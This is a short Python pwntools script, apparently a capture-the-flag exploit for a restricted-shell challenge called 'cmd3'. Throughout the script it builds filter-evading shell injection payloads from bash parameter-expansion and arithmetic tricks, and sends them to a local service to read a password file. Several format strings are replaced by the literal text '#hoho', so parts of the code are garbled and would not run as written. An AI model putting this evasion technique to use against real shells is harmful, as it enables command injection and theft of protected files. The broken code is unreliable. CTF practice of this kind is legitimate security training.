from pwn import *

#;ABCDefgh;____=${_:1:1} => A
#;ABCDefgh;____=${_:1:2} => AB
#;ABCDefgh;____=${_:2:1} => B

# (($#-$#)) => 0
# (-~($#-$#)) => 1
# ((-~($#-$#)-~($#-$#))) => 2
# ...

def init_string():
   global string_gadget
   string_gadget=dict()
   #hoho

   # ....do......f...u...z...z...............


def make_num(num):
   if num == 0:
      return "(($#-$#))"
   else:
      return "#hoho"%("-~#hoho"*num)

def make_string(string):
   count = 0
   pay = str()
   for i in string_gadget.keys():
      for j in i:
         if string[count] == j:
            pay += "#hoho}"%(string_gadget[i],make_num(i.find(j)),make_num(1)) # use format get error
            count += 1
            if count == len(string):
               return pay



# ...


def filename_in_payload(i):

   if ord('0') <= ord(i) <= ord('9'):
      return ';#hoho$' + make_num(ord(i) - ord('0'))
   else:
      return "%s#hoho}" % (make_string(i.lower()))

if __name__ == '__main__':

   init_string()
   p = remote("0", 9023)
   p.recvuntil("your password is in ")

   filename = p.recvline()[8:-1]
   print "[File] : {0}".format(filename)

   pay = "??#hoho=${_:%s}"% (make_num(5)) #jail/cat, if use format get error
   pay += ";??#hoho___=$#hoho" #flagbox
   for i in filename:
      pay += filename_in_payload(i)

   pay += ";#hoho<$#hoho__"

   p.recvuntil("cmd3$ ")
   p.sendline(pay)

   p.interactive()
